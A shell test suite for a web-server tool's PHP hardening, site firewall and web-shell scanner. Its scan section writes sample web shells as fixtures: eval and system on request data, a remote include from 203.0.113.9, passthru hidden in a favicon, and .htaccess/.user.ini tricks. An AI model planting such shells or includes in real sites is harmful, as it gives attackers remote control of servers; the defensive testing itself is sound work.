assert_has "setup.sh has the command" 'php-cleanup)    lib_php_cleanup_main' "$(cat "$ROOT/setup.sh")"
assert_has "the menu offers it"       '22) _menu_run php-cleanup' "$(cat "$ROOT/lib/menu.sh")"
PHP_APT_HISTORY="$_pc_hist"; eval "$_pc_saved"; unset -f apt-get apt-mark

# =============================================================================
section "harden: what a PHP shell in one site can do"
# A shell dropped into a site runs as that site's PHP. It should start no process, read nothing
# outside the site, not run from an upload directory, and reach no local port it has no use for.
_hd_fns="lib_domains_list lib_mail_installed _sitefw_uid lib_sitefw_loaded lib_service_enabled lib_ols_is_installed lib_ols_change_begin lib_ols_change_commit lib_harden_php_restart _harden_code lib_require_tools lib_require_installed lib_system_profile lib_domain_registered"
_hd_saved="$(for _f in $_hd_fns; do declare -f "$_f" || true; done)"
_hd_state="$STATE_DIR"; STATE_DIR="$TMP/hd-state"; mkdir -p "$STATE_DIR"; printf '{}\n' >"$STATE_DIR/manifest.json"
_hd_ini="$HARDEN_PHP_INI_ROOT"; HARDEN_PHP_INI_ROOT="$TMP/hd-ini"
_hd_fw="$SITEFW_DIR"; SITEFW_DIR="$TMP/hd-fw"; _hd_sc="$SITEFW_SCRIPT"; SITEFW_SCRIPT="$TMP/hd-fw-script"; _hd_un="$SITEFW_UNIT"; SITEFW_UNIT="$TMP/hd-fw.service"
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
_hd_site() {   # domain mode [proxy-target]
  local d="$1" i="${1//./_}"
  mkdir -p "$STATE_DIR/domains/$d"
  jq -n --arg d "$d" --arg i "$i" --arg h "$SITES_ROOT/$d" --arg m "$2" --arg p "${3:-}" \
    '{domain:$d, ident:$i, user:$i, group:$i, home:$h, mode:$m, proxy:{target:$p},
      php:{version:"8.3", children:4, memory_limit:"256M", upload_max:"64M"}}' >"$STATE_DIR/domains/$d/domain.json"
}
_hd_site hd1.example.com php; _hd_site hd2.example.com wordpress; _hd_site hd3.example.com proxy "127.0.0.1:3000"
jq '.proxies = [{path:"/api/", target:"http://127.0.0.1:8081"}, {path:"/far/", target:"http://10.0.0.5:9000"}]' \
  "$STATE_DIR/domains/hd1.example.com/domain.json" >"$TMP/hd.json" && cat "$TMP/hd.json" >"$STATE_DIR/domains/hd1.example.com/domain.json"

# a site an older release made has no decision recorded, and renders as it always did
lib_domain_state_load hd1.example.com
assert_eq "an older site has no decision recorded" "" "${D_SEC_EXEC}${D_SEC_UPLOAD}"
_vh="$(lib_ols_render_vhconf)"
assert_lacks "its PHP is pointed at no ini directory" "PHP_INI_SCAN_DIR" "$_vh"
assert_lacks "and its upload directories run scripts as before" "(uploads?|files|media|cache|te?mp)" "$_vh"
# a new site starts hardened
( lib_domain_parse_add_args new.example.com >/dev/null 2>&1; printf '%s %s' "$D_SEC_EXEC" "$D_SEC_UPLOAD" ) >"$TMP/hd-new" 2>/dev/null || true
assert_eq "a new site starts with both blocked" "blocked blocked" "$(cat "$TMP/hd-new")"

D_SEC_EXEC="blocked"; D_SEC_UPLOAD="blocked"
_vh="$(lib_ols_render_vhconf)"; printf '%s\n' "$_vh" >"$TMP/hd.vhconf"
assert_true "the hardened vhost is balanced" _ols_braces_balanced "$TMP/hd.vhconf"
assert_has "its PHP reads the site's ini directory after the version's own" \
  "  env                     PHP_INI_SCAN_DIR=:${HARDEN_PHP_INI_ROOT}/hd1.example.com" "$_vh"
assert_has "inside the site's own processor" "PHP_INI_SCAN_DIR" "$(awk '/^extprocessor hd1_example_com \{/,/^\}/' "$TMP/hd.vhconf")"
assert_lacks "disable_functions is not left to phpIniOverride, which cannot set it" "php_admin_value disable_functions" "$_vh"
_rule="$(grep -F '(uploads?|files|media|cache|te?mp)' "$TMP/hd.vhconf" || true)"
assert_has "scripts in upload directories are refused" '\.(php[0-9]?|phtml|phar)(/|$) - [F,L]' "$_rule"
# the rule as PCRE would read it, against the requests that matter
_hd_re='^/?(.*/)?(uploads?|files|media|cache|te?mp)/.*\.(php[0-9]?|phtml|phar)(/|$)'
_hd_m() { grep -qiP -- "$_hd_re" <<<"$1"; }
if grep -qP 'a' <<<a 2>/dev/null; then
  for _u in /uploads/shell.php /upload/a/b.PHP /app/files/x.phtml /media/2026/x.php7 /cache/x.phar /tmp/x.php /temp/x.php /uploads/x.php/extra/path; do
    assert_true "refused: ${_u}" _hd_m "$_u"
  done
  for _u in /index.php /uploads/photo.jpg /uploads/readme.php.txt /admin/upload.php /filesystem/x.php /mediator.php /uploads.php; do
    assert_false "served: ${_u}" _hd_m "$_u"
  done
fi
D_MODE="wordpress"
assert_lacks "WordPress keeps its own rule, for wp-content/uploads alone" "(uploads?|files|media|cache|te?mp)" "$(lib_ols_render_vhconf)"
D_MODE="php"
_ini="$(lib_harden_render_php_ini)"
for _f in exec passthru shell_exec system proc_open popen pcntl_exec putenv dl; do
  assert_has "disabled: ${_f}" ",${_f}," ",$(sed -n 's/^disable_functions = //p' <<<"$_ini"),"
done
assert_lacks "mail() stays: sites send mail" ",mail," ",$(sed -n 's/^disable_functions = //p' <<<"$_ini"),"
assert_has "PHP reads the site's home, its logs, PHP's own share and /tmp - nothing else" \
  "open_basedir = ${D_HOME}/:${SITES_LOG_ROOT}/hd1.example.com/:${LSWS_HOME}/lsphp83/share/:/tmp/" "$_ini"

# the ini directory follows the state: written when blocked, removed when allowed
HARDEN_PHP_CHANGED=""
lib_harden_php_ini_write
_hf="$HARDEN_PHP_INI_ROOT/hd1.example.com/$HARDEN_PHP_INI_NAME"
assert_true "blocked: the ini is written" test -s "$_hf"
assert_eq   "and the site is named as changed" "hd1.example.com" "$HARDEN_PHP_CHANGED"
if (( CAN_CHMOD )); then
  assert_eq "the site's group may read it, nobody may change it" "640 750" "$(stat -c %a "$_hf") $(stat -c %a "$(dirname "$_hf")")"
fi
HARDEN_PHP_CHANGED=""; lib_harden_php_ini_write
assert_eq   "a second write changes nothing" "" "$HARDEN_PHP_CHANGED"
assert_has  "writing a vhost puts its ini directory in place" 'lib_harden_php_ini_write' "$(declare -f lib_ols_vhconf_write)"
D_SEC_EXEC="allowed"; HARDEN_PHP_CHANGED=""; lib_harden_php_ini_write
assert_false "allowed: the directory goes" test -e "$(dirname "$_hf")"
assert_eq    "which is a change too" "hd1.example.com" "$HARDEN_PHP_CHANGED"
assert_lacks "and the vhost points PHP at nothing" "PHP_INI_SCAN_DIR" "$(lib_ols_render_vhconf)"
D_SEC_EXEC="blocked"; D_MODE="proxy"; lib_harden_php_ini_write
assert_false "a site with no PHP gets no ini" test -e "$(dirname "$_hf")"
OPT_DRY_RUN=1; D_MODE="php"; lib_harden_php_ini_write >/dev/null 2>&1; OPT_DRY_RUN=0
assert_false "a dry run writes none" test -e "$_hf"
assert_has "remove takes the ini directory with the files" '"$(lib_harden_php_ini_dir "$domain")"' "$(declare -f lib_domain_remove_main)"

# the decision survives a save and a load, and an older site's absence of one does too
lib_domain_state_load hd1.example.com; D_SEC_EXEC="allowed"; D_SEC_UPLOAD="blocked"; lib_domain_state_save
lib_domain_state_load hd1.example.com
assert_eq "the decision is kept in the site's state" "allowed blocked" "$D_SEC_EXEC $D_SEC_UPLOAD"
assert_eq "with the path proxies another module wrote" 2 "$(jq '.proxies | length' "$STATE_DIR/domains/hd1.example.com/domain.json")"
lib_domain_state_load hd2.example.com; lib_domain_state_save; lib_domain_state_load hd2.example.com
assert_eq "saving an undecided site decides nothing" "" "${D_SEC_EXEC}${D_SEC_UPLOAD}"
assert_eq "and writes no key" "null" "$(jq -c '.security' "$STATE_DIR/domains/hd2.example.com/domain.json")"

# ---- the site firewall
assert_eq "a local target gives its port"    "3000" "$(_sitefw_local_port 127.0.0.1:3000)"
assert_eq "with a scheme and a path too"     "8081" "$(_sitefw_local_port http://127.0.0.1:8081/x)"
assert_eq "localhost and ::1 are local"      "90 91" "$(_sitefw_local_port localhost:90 | tr '\n' ' '; _sitefw_local_port 'http://[::1]:91')"
assert_eq "another machine's port is not this site's" "" "$(_sitefw_local_port http://10.0.0.5:9000)"
eval '_sitefw_uid() { case "$1" in hd1_example_com) echo 2001 ;; hd2_example_com) echo 2002 ;; hd3_example_com) echo 2003 ;; root0) echo 0 ;; esac; }
      lib_mail_installed() { return 1; }'
assert_eq "each site: its uid and its own local ports" "2001 8081|2002 |2003 3000" "$(lib_sitefw_sites | paste -sd'|' -)"
_r4="$(lib_sitefw_render 4)"; _r6="$(lib_sitefw_render 6)"
assert_eq  "the chains are named, which empties them when the file loads" ":LOMP-SITES - [0:0]|:LOMP-SITES-LOCAL - [0:0]" "$(grep '^:' <<<"$_r4" | paste -sd'|' -)"
assert_eq  "answers pass first: an application still answers the web server" \
  "-A LOMP-SITES -m conntrack --ctstate ESTABLISHED,RELATED -j RETURN" "$(grep '^-A' <<<"$_r4" | head -n 1)"
assert_has "a site reaches its own application" "-A LOMP-SITES -m owner --uid-owner 2003 -p tcp -m multiport --dports 3000 -j RETURN" "$_r4"
assert_has "and its own path proxy"             "-A LOMP-SITES -m owner --uid-owner 2001 -p tcp -m multiport --dports 8081 -j RETURN" "$_r4"
assert_lacks "but not another site's"           "--uid-owner 2001 -p tcp -m multiport --dports 3000" "$_r4"
assert_eq  "every site's user is sent to the local rules" 3 "$(grep -c -- '-m owner --uid-owner [0-9]* -j LOMP-SITES-LOCAL' <<<"$_r4")"
assert_has "which allow DNS, the web server, MariaDB and Redis" "-A LOMP-SITES-LOCAL -p tcp -m multiport --dports 53,80,443,3306,6379 -j RETURN" "$_r4"
assert_lacks "not the WebAdmin panel" "7080" "$_r4"
assert_lacks "nor SSH"                ",22," ",$(sed -n 's/.*LOCAL -p tcp -m multiport --dports \([0-9,]*\).*/\1/p' <<<"$_r4"),"
assert_eq  "and refuse the rest, at once" "-A LOMP-SITES-LOCAL -p tcp -j REJECT --reject-with tcp-reset|-A LOMP-SITES-LOCAL -j REJECT|COMMIT" "$(tail -n 3 <<<"$_r4" | paste -sd'|' -)"
assert_has "IPv4 lets ICMP through" "-p icmp -j RETURN" "$_r4"
assert_has "IPv6 its own"           "-p ipv6-icmp -j RETURN" "$_r6"
eval 'lib_mail_installed() { return 0; }'
assert_has "a server with mail lets sites submit it" "--dports 53,80,443,3306,6379,25,465,587 -j RETURN" "$(lib_sitefw_render 4)"
eval 'lib_mail_installed() { return 1; }'
_sc="$(lib_sitefw_render_script)"
assert_has "the loader replaces only its own chains" 'restore" --noflush <"$d/rules.v$v"' "$_sc"
assert_has "hooks them to connections to this machine" '-I OUTPUT 1 -o lo -j "$c"' "$_sc"
assert_true "and is a valid script" sh -n <<<"$_sc"
assert_has "loaded at boot, after UFW" "After=ufw.service" "$(lib_sitefw_render_unit)"
# off until switched on: nothing is written and nothing loaded
lib_sitefw_regen
assert_false "while it is off, regen writes nothing" test -e "$SITEFW_DIR"
lib_manifest_set_json '.params.site_firewall' 'true'
printf '#!/bin/sh\necho "$@" >>"%s"\n' "$TMP/hd-fw-calls" >"$SITEFW_SCRIPT"; chmod +x "$SITEFW_SCRIPT"; : >"$TMP/hd-fw-calls"
eval 'lib_sitefw_loaded() { return 0; }'
lib_sitefw_regen
assert_true "switched on, the rules are written" test -s "$SITEFW_DIR/rules.v4" -a -s "$SITEFW_DIR/rules.v6"
assert_eq   "and loaded" "start" "$(cat "$TMP/hd-fw-calls")"
: >"$TMP/hd-fw-calls"; lib_sitefw_regen
assert_eq   "unchanged rules are not loaded again" "" "$(cat "$TMP/hd-fw-calls")"
eval 'lib_sitefw_loaded() { return 1; }'
lib_sitefw_regen >/dev/null 2>&1
assert_eq   "unless the kernel lost them" "start" "$(cat "$TMP/hd-fw-calls")"
eval 'lib_sitefw_loaded() { return 0; }'
_hd_site hd4.example.com php; eval '_sitefw_uid() { case "$1" in hd4_example_com) echo 2004 ;; *) echo 2001 ;; esac; }'
: >"$TMP/hd-fw-calls"; OPT_DRY_RUN=1; lib_sitefw_regen >/dev/null 2>&1; OPT_DRY_RUN=0
assert_lacks "a dry run writes no rule for a new site" "2004" "$(cat "$SITEFW_DIR/rules.v4")"
assert_eq    "and loads nothing" "" "$(cat "$TMP/hd-fw-calls")"
lib_sitefw_regen
assert_has  "a new site is in the rules once they are regenerated" "--uid-owner 2004 -j LOMP-SITES-LOCAL" "$(cat "$SITEFW_DIR/rules.v4")"
assert_has  "applying a vhost regenerates them" 'lib_sitefw_regen' "$(declare -f lib_domain_apply_config)"
assert_has  "and so does removing a site"       'lib_sitefw_regen' "$(declare -f lib_domain_remove_main)"

# ---- the command
: >"$TMP/hd-calls"
eval 'lib_require_tools() { :; }; lib_require_installed() { :; }; lib_system_profile() { :; }
      lib_ols_is_installed() { return 0; }
      lib_ols_change_begin() { OLS_PENDING_RELOAD=0; }
      lib_ols_change_commit() { printf "commit %s\n" "$*" >>"$TMP/hd-calls"; }
      lib_harden_php_restart() { printf "restart %s\n" "$1" >>"$TMP/hd-calls"; }
      lib_domain_registered() { [[ -s "$STATE_DIR/domains/$1/domain.json" ]]; }
      _harden_code() { cat "$TMP/hd-code" 2>/dev/null || printf 200; }'
_out="$(OPT_QUIET=0; lib_harden_main --all 2>&1; printf 'rc=%s' "$?")"
assert_has "harden --all exits 0" "rc=0" "$_out"
for _d in hd1 hd2 hd4; do
  assert_eq "${_d}: process execution blocked in its state" "blocked" "$(jq -r '.security.php_exec' "$STATE_DIR/domains/${_d}.example.com/domain.json")"
  assert_true "${_d}: its ini is in place" test -s "$HARDEN_PHP_INI_ROOT/${_d}.example.com/$HARDEN_PHP_INI_NAME"
  assert_has  "${_d}: its PHP is started again to read it" "restart ${_d}_example_com" "$(cat "$TMP/hd-calls")"
done
assert_has "the proxy site is told only the firewall applies" "hd3.example.com: no PHP runs here (proxy)" "$_out"
assert_eq  "and gets no decision" "null" "$(jq -c '.security' "$STATE_DIR/domains/hd3.example.com/domain.json")"
assert_eq  "one change set for all of them" 1 "$(grep -c '^commit site hardening' "$TMP/hd-calls")"
# one site that needs exec keeps it, and only it
: >"$TMP/hd-calls"
_out="$(OPT_QUIET=0; lib_harden_main hd4.example.com --allow-exec 2>&1)"
assert_eq    "--allow-exec is recorded" "allowed" "$(jq -r '.security.php_exec' "$STATE_DIR/domains/hd4.example.com/domain.json")"
assert_eq    "its upload directories stay closed" "blocked" "$(jq -r '.security.upload_php' "$STATE_DIR/domains/hd4.example.com/domain.json")"
assert_false "its ini directory goes" test -e "$HARDEN_PHP_INI_ROOT/hd4.example.com"
assert_true  "the others keep theirs" test -s "$HARDEN_PHP_INI_ROOT/hd1.example.com/$HARDEN_PHP_INI_NAME"
assert_lacks "and are not restarted" "restart hd1_example_com" "$(cat "$TMP/hd-calls")"
# a site that answered before and not after is named, and the command fails
printf '200' >"$TMP/hd-code"
eval 'lib_harden_php_restart() { printf 500 >"$TMP/hd-code"; }'
_out="$(OPT_QUIET=0; rc=0; lib_harden_main hd1.example.com >"$TMP/hd-out" 2>&1 || rc=$?; cat "$TMP/hd-out"; printf 'rc=%s' "$rc")"
assert_has "a site that stops answering is named" "hd1.example.com (HTTP 200 -> 500)" "$_out"
assert_has "with the way back" "lomp harden <domain> --allow-exec" "$_out"
assert_has "and a failing status" "rc=1" "$_out"
rm -f "$TMP/hd-code"
_out="$(OPT_QUIET=0; OPT_DRY_RUN=1; lib_harden_main hd4.example.com 2>&1)"
assert_eq  "a dry run changes no state" "allowed" "$(jq -r '.security.php_exec' "$STATE_DIR/domains/hd4.example.com/domain.json")"
assert_has "and says what it would do"  "hd4.example.com: process execution would be blocked" "$_out"
# In a shell that has only these functions, so the words are what is checked: whatever else the
# command needs is missing there, and a missing function ends it with the same status. That is
# how this passed for a while with lib_domain_valid left out - refused as "Invalid domain name".
_out="$(bash -c "$(declare -f lib_harden_main lib_require_tools lib_require_installed lib_domain_valid lib_domain_arg_ok lib_domain_registered lib_die 2>/dev/null); STATE_DIR='$STATE_DIR'; lib_harden_main nosuch.example.com" 2>&1 || true)"
assert_has "a site that is not registered is refused" "Site nosuch.example.com is not registered" "$_out"
# Two state directories whose names are no domain names ("restore" took any name until 1.0.87).
# One is a name a site can have, and that site is hardened by its name like any other. The
# other is not even that: typed, it is refused; met by --all, it must not stop the hardening
# of the sites beside it. (With the real lookup, which this section stands in for elsewhere,
# and each run in a subshell of its own: a refusal ends the shell it happens in.)
_hd_site old_name php; _hd_site old_name_ php
_hd_real="$(grep -E '^lib_domain_registered\(\) ' "$ROOT/lib/common.sh")"
_out="$(eval "$_hd_real"; OPT_QUIET=0; OPT_DRY_RUN=1; rc=0; ( lib_harden_main old_name ) >"$TMP/hd-out" 2>&1 || rc=$?; cat "$TMP/hd-out"; printf 'rc=%s' "$rc")"
assert_has "a site under a name that is no domain name is hardened by that name" "old_name: process execution would be blocked" "$_out"
assert_has "and that is no failure"                                              "rc=0" "$_out"
_out="$(eval "$_hd_real"; OPT_QUIET=0; rc=0; ( lib_harden_main old_name_ ) >"$TMP/hd-out" 2>&1 || rc=$?; cat "$TMP/hd-out"; printf 'rc=%s' "$rc")"
assert_has "a name no site can have is refused when it is typed" "Invalid domain name 'old_name_'" "$_out"
assert_has "with a failing status"                               "rc=1" "$_out"
_out="$(eval "$_hd_real"; OPT_QUIET=0; OPT_DRY_RUN=1; rc=0; ( lib_harden_main --all ) >"$TMP/hd-out" 2>&1 || rc=$?; cat "$TMP/hd-out"; printf 'rc=%s' "$rc")"
assert_has   "harden --all is not stopped by a state directory under such a name" "rc=0" "$_out"
assert_has   "the sites beside it are still gone through"                         "hd1.example.com: process execution would be blocked" "$_out"
assert_lacks "and --all refuses no name of the registry's own"                    "Invalid domain name" "$_out"
rm -rf "$STATE_DIR/domains/old_name" "$STATE_DIR/domains/old_name_"; rm -f "$TMP/hd-code"
_st="$(lib_harden_status)"
assert_has "status shows the firewall" "Site firewall: on" "$_st"
assert_has "and each site's decision"  "allowed" "$(grep '^hd4.example.com' <<<"$_st")"
assert_has "doctor names a site nobody decided about" 'site ${d}: hardening' "$(declare -f _doc_check_domains)"
assert_has "and a firewall that is off or not loaded" 'lib_sitefw_loaded' "$(declare -f _doc_check_sitefw)"
assert_has "setup.sh has the command" 'harden)         lib_harden_main' "$(cat "$ROOT/setup.sh")"
assert_has "status takes no lock"     'harden) case "${rest[0]:-help}" in status|help' "$(cat "$ROOT/setup.sh")"
assert_has "the menu offers it"       '23) _menu_harden' "$(cat "$ROOT/lib/menu.sh")"
assert_has "update keeps the firewall's loader current" 'lib_sitefw_migrate' "$(declare -f lib_install_migrate)"
assert_has "where the firewall is on"                   'lib_sitefw_enable ||' "$(declare -f lib_sitefw_migrate)"

# ---- a setting an install re-run dropped
# lib_install_manifest wrote .params anew, so the firewall read as off while its rules stayed
# loaded and its unit enabled: a site added then got no rules of its own. migrate knows a server
# in that state by the enabled unit beside no setting at all, and puts the setting back.
eval 'lib_service_enabled() { [[ -e "$TMP/hd-unit-enabled" ]]; }'
# Nothing of this machine's is in reach of it here: no systemctl, no iptables, and the loader it
# writes is the recording one from above, not the real script.
cp "$SITEFW_SCRIPT" "$TMP/hd-fw-stub"
_hd_migrate() {
  ( eval 'systemctl() { :; }
          lib_have() { [[ "$1" == "iptables-restore" ]] || command -v "$1" >/dev/null 2>&1; }
          lib_sitefw_render_script() { cat "$TMP/hd-fw-stub"; }'
    OPT_QUIET=0; lib_sitefw_migrate 2>&1 )
}
_hd_setting() { lib_json_get_raw "$STATE_DIR/manifest.json" '.params.site_firewall'; }
: >"$TMP/hd-unit-enabled"
assert_false "a setting that says on is not lost" lib_sitefw_setting_lost
lib_manifest_set_json '.params.site_firewall' 'false'
assert_false "nor is one that says off, whatever the unit" lib_sitefw_setting_lost
_out="$(_hd_migrate)"
assert_eq    "migrate leaves a firewall that was switched off alone" "false|" "$(_hd_setting)|${_out}"
lib_json_set "$STATE_DIR/manifest.json" 'del(.params.site_firewall)'
assert_true  "no setting at all beside an enabled unit is" lib_sitefw_setting_lost
rm -f "$TMP/hd-unit-enabled"
assert_false "without the unit the firewall was never on" lib_sitefw_setting_lost
: >"$TMP/hd-fw-calls"; _out="$(_hd_migrate)"
assert_eq    "and migrate leaves it off, silently" "||" "$(_hd_setting)|$(cat "$TMP/hd-fw-calls")|${_out}"
# the lost one: a site added while the firewall read as off comes into the rules
: >"$TMP/hd-unit-enabled"
_hd_site hd5.example.com php; eval '_sitefw_uid() { case "$1" in hd5_example_com) echo 2005 ;; hd4_example_com) echo 2004 ;; *) echo 2001 ;; esac; }'
lib_sitefw_regen
assert_lacks "while it reads as off, a new site gets no rules" "2005" "$(cat "$SITEFW_DIR/rules.v4")"
_out="$(OPT_DRY_RUN=1; _hd_migrate)"
assert_has   "a dry run says what migrate would do" "[dry-run] would record the site firewall as on again" "$_out"
assert_eq    "and records nothing" "" "$(_hd_setting)"
_out="$(_hd_migrate)"
assert_eq    "migrate puts the lost setting back" "true" "$(_hd_setting)"
assert_has   "the site added meanwhile has its rules" "--uid-owner 2005 -j LOMP-SITES-LOCAL" "$(cat "$SITEFW_DIR/rules.v4")"
assert_eq    "and they are loaded" "start" "$(cat "$TMP/hd-fw-calls")"
assert_has   "it says so" "The site firewall is recorded as on again" "$_out"
assert_eq    "once: the next run finds nothing lost" "" "$(_hd_migrate)"
# rules the kernel refuses switch it off again, as "harden" would: nothing is called on then
lib_json_set "$STATE_DIR/manifest.json" 'del(.params.site_firewall)'
eval 'lib_sitefw_loaded() { return 1; }'
_out="$(_hd_migrate)"
eval 'lib_sitefw_loaded() { return 0; }'
assert_eq    "a firewall the kernel does not take is recorded as off" "false" "$(_hd_setting)"
assert_lacks "and not reported as on again" "recorded as on again" "$_out"
rm -f "$TMP/hd-unit-enabled"
STATE_DIR="$_hd_state"; HARDEN_PHP_INI_ROOT="$_hd_ini"; SITEFW_DIR="$_hd_fw"; SITEFW_SCRIPT="$_hd_sc"; SITEFW_UNIT="$_hd_un"
# shellcheck disable=SC2086
unset -f $_hd_fns _hd_site _hd_m _hd_migrate _hd_setting; eval "$_hd_saved"
lib_domain_state_reset

# =============================================================================
section "scan: what a web shell is made of, and not what an honest file has"
# The files below are what the command is for and what it must leave alone. Each check reads
# the records the awk program prints (P = a file, F = a finding in it), then the command's own
# output once.
_sc_saved="$(declare -f lib_domains_list)"
_sc_state="$STATE_DIR"; STATE_DIR="$TMP/sc-state"
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
for _d in sc1.example.com sc2.example.com; do
  mkdir -p "$STATE_DIR/domains/$_d" "$SITES_ROOT/$_d/public_html"; printf '{}\n' >"$STATE_DIR/domains/$_d/domain.json"
done
_sc="$SITES_ROOT/sc1.example.com"; _scp="$_sc/public_html"
mkdir -p "$_scp/wp-content/uploads/2026" "$_scp/lib"
_sc_b64="$(printf 'QUJD%.0s' $(seq 1 400))"   # 1600 characters of base64
# an honest file: the same functions, used the way applications use them
cat >"$_scp/lib/honest.php" <<EOF
<?php
// evaluate the form, then include the header: system requirements are checked in exec order
// \$_POST['name'] (string) is the visitor's name; class FilesManager stores what was sent
\$data = base64_decode(\$row['payload']);
\$pdo->exec("DELETE FROM log"); \$out = curl_exec(\$ch); Db::exec(\$sql); \$r = \$this->system(\$x);
\$s = preg_replace('/\s+/i', ' ', \$s); \$t = preg_replace('#<e>#', '', \$t);
require_once \$_SERVER['DOCUMENT_ROOT'] . '/config.php'; include 'header.php';
if (isset(\$_POST['name'])) { \$name = trim(\$_POST['name']); \$obj->save(\$_POST['name']); }
echo '<img src="data:image/png;base64,${_sc_b64}">';
echo "\xEF\xBB\xBF" . chr(13) . chr(10);
\$map = array("\x80" => "\xE2\x82\xAC", "\x81" => "\xEF\xBF\xBD", "\x82" => "\xE2\x80\x9A", "\x83" => "\xC6\x92", "\x84" => "\xE2\x80\x9E", "\x85" => "\xE2\x80\xA6", "\x09\x0A\x0B\x0C\x0D\x20\x2F\x3E");
EOF
printf '<?php eval(base64_decode("ZWNobyAxOw=="));\n' >"$_scp/a-decoded.php"
printf '<?php\n\n@eval ( $_POST["c"] );\n' >"$_scp/b-request.php"
printf '<?php echo "<pre>"; system($_GET["cmd"]); ?>\n' >"$_scp/c-command.php"
printf '<?php $_GET["f"]($_GET["a"]);\n' >"$_scp/d-named.php"
printf '<?php include($_REQUEST["p"]);\n' >"$_scp/e-include.php"
printf '<?php include "http://203.0.113.9/x.txt";\n' >"$_scp/f-remote.PHP"
printf '<?php /* WSO Shell */ $default_action = "FilesMan";\n' >"$_scp/g-known.phtml"
printf 'GIF89a<?php passthru($_COOKIE["x"]);\n' >"$_scp/favicon.ico"
printf '<?php $c = gzinflate(base64_decode($s)); $f($_POST["a"]);\n' >"$_scp/h-packed.php"
printf '<?php $p = "%s";\n' "$_sc_b64" >"$_scp/i-long.php"
printf '<?php $k = "%s";\n$j = "%s";\n' "$(printf '\\x6a%.0s' $(seq 1 25))" "$(printf '\\x6b%.0s' $(seq 1 30))" >"$_scp/j-hex.php"
printf '<?php $n = %s"";\n' "$(printf 'chr(1%.0s).' $(seq 1 9))" >"$_scp/k-chr.php"
printf '<?php // Silence is golden.\n' >"$_scp/wp-content/uploads/2026/index.php"
printf 'auto_prepend_file = /home/sc1.example.com/public_html/a-decoded.php\n' >"$_scp/.user.ini"
printf 'AddType application/x-httpd-php .jpg\n' >"$_scp/.htaccess"
printf '<?php file_put_contents("x.php", $_POST["body"]); preg_replace("/.*/e", $_x, "");\n' >"$_scp/l-write.php"
printf '<?php eval(base64_decode("x")); // \033[2J\033]0;owned\007 \302\233 31m\n' >"$_scp/m-escape.php"
: >"$_scp/empty.php"
_rec="$(_scan_run "$_sc" 0)"
_sc_file() { awk -F'\t' -v f="$1" '$1 == "P" { on = ($3 == f) } on' <<<"$_rec"; }   # the records of one file
assert_lacks "an honest file is not listed" "honest.php" "$_rec"
assert_lacks "nor an empty one" "empty.php" "$_rec"
for _c in "a-decoded.php|eval of decoded data" "b-request.php|eval of what the request sent" \
          "c-command.php|a command made of what the request sent" "d-named.php|a function named by the request" \
          "e-include.php|include of a file the request names" "f-remote.PHP|include from an address or a stream" \
          "g-known.phtml|the name of a known web shell" "favicon.ico|PHP code in a file that is not named as a script"; do
  _r="$(_sc_file "public_html/${_c%%|*}")"
  assert_has "strong: ${_c%%|*}" $'P\tH\tpublic_html/'"${_c%%|*}" "$_r"
  assert_has "  as ${_c##*|}" "${_c##*|}" "$_r"
done
assert_has "the line is named" $'F\tH\t3\teval of what the request sent\t@eval ( $_POST["c"] );' "$(_sc_file public_html/b-request.php)"
for _c in "h-packed.php|decoding inside decoding (packed code)" "h-packed.php|a function held in a variable, called with request data" \
          "i-long.php|a long encoded string (1600 characters)" "j-hex.php|text hidden as \\x escapes (25 letters on one line)" \
          "k-chr.php|text put together from chr() pieces" "wp-content/uploads/2026/index.php|a script in an upload directory" \
          ".user.ini|a file run before or after every script" ".htaccess|file types handed to PHP" \
          "l-write.php|what the request sent, written to a file" "l-write.php|preg_replace with the e modifier"; do
  _r="$(_sc_file "public_html/${_c%%|*}")"
  assert_has "worth a look: ${_c%%|*}" $'P\tL\tpublic_html/'"${_c%%|*}" "$_r"
  assert_has "  as ${_c##*|}" "${_c##*|}" "$_r"
done
assert_eq  "a second line of the same kind is not a second finding" 1 "$(_sc_file public_html/j-hex.php | grep -c 'text hidden as' || true)"
assert_has "every file read is counted, the empty one too" $'N\t19\t0' "$_rec"
assert_eq  "a finding is reported once per file" 1 "$(printf '<?php\neval(base64_decode("a"));\neval(base64_decode("b"));\n' >"$_scp/a-decoded.php"; _scan_run "$_sc" 0 | grep -c $'^F\tH\t[0-9]*\teval of decoded data\teval(base64_decode("[ab]' || true)"
# what the site's files say reaches a terminal as printable characters only
_r="$(_sc_file public_html/m-escape.php)"
assert_has   "text from a file is shown" 'eval(base64_decode("x")); // ?[2J?]0;owned? ?? 31m' "$_r"
assert_lacks "without its escape sequences" $'\033' "$_rec"
if printf '<?php eval($_POST[1]);\n' >"$_scp/n"$'\033[31m\n'".php" 2>/dev/null; then
  _rec="$(_scan_run "$_sc" 0)"
  assert_has   "a file name keeps to one line" $'P\tH\tpublic_html/n?[31m?.php' "$_rec"
  assert_lacks "and brings no escape sequence" $'\033' "$_rec"
  rm -f "$_scp/n"$'\033[31m\n'".php"
fi
# --wide lists every use, the honest ones too
_rec="$(_scan_run "$_sc" 1)"; _r="$(_sc_file public_html/lib/honest.php)"
assert_has   "--wide lists a file that only uses base64_decode" "uses base64_decode()" "$_r"
assert_lacks "a method called exec is not process execution" "starts a process" "$_r"
assert_lacks "nor is the word in a comment eval" "uses eval()" "$_r"
assert_has   "--wide names the call that starts a process" "starts a process" "$(_sc_file public_html/c-command.php)"
# a link is not followed: what it names is not this site's
if (( CAN_SYMLINK )); then
  printf '<?php eval($_POST[1]);\n' >"$TMP/sc-outside.php"
  ln -s "$TMP/sc-outside.php" "$_scp/linked.php"; mkdir -p "$TMP/sc-outdir"; cp "$TMP/sc-outside.php" "$TMP/sc-outdir/x.php"; ln -s "$TMP/sc-outdir" "$_scp/linkdir"
  _rec="$(_scan_run "$_sc" 0)"
  assert_lacks "a linked file is not read" "linked.php" "$_rec"
  assert_lacks "nor a linked directory entered" "linkdir" "$_rec"
fi
# the command: strong findings first, the counts, and nothing changed
_sc_sum() { find "$_sc" -type f -exec cksum {} + | sort; }
_before="$(_sc_sum)"
_out="$(OPT_QUIET=0; rc=0; lib_scan_main --all >"$TMP/sc-out" 2>&1 || rc=$?; cat "$TMP/sc-out"; printf 'rc=%s' "$rc")"
assert_eq  "scan changes no file" "$_before" "$(_sc_sum)"
assert_has "it exits 0, findings or not" "rc=0" "$_out"
assert_has "a strong finding is shown with its file" "  STRONG  public_html/b-request.php" "$_out"
assert_has "its line and what it is" "          line 3: eval of what the request sent" "$_out"
